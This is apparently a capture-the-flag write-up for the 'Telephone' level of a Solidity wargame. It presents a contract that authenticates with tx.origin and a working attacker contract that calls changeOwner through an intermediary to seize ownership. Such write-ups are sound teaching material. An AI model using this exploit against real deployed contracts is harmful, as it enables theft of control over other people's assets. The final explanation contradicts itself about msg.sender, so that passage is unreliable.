# 04. Telephone

Claim ownership of the contract to win the challenge.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

The above contract is fairly simple as long as the distinction between tx.origin and msg.sender is understood.

tx.origin is the External Owned Account address that triggered the whole call chain.
msg.sender is the address of the function caller.

So in order to claim ownership we must send our address as parameter to the changeOwner function through an intermediary.

Let's build a simple smart contract to do so :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ClaimOwnership {
    
    address targetContract;
    
    constructor(address _targetContract) {
        targetContract = _targetContract;
    }
    
    function attack(address _owner) public returns (bool) {
        (bool success, bytes memory rvalue) = targetContract.call(abi.encodeWithSignature("changeOwner(address)", _owner));
        return success;
    }
}
```

This simple contract should be deployed with the target contract address as a constructor parameter.
Then it is as simple as calling the attack function with your personal address passed as parameter.
Internally, the contract will call the changeOwner function from the targetContract and claim ownership.

## Explanation

Your account address (A) initiates the transaction and is therefore tx.origin.
Our ClaimOwnership contract (B) reacts to (A) and calls the target contract (C), while inside B tx.origin and msg.sender are both A
but inside C msg.sender is not B since the direct caller of C is B which is different from tx.origin and therefore claims ownership.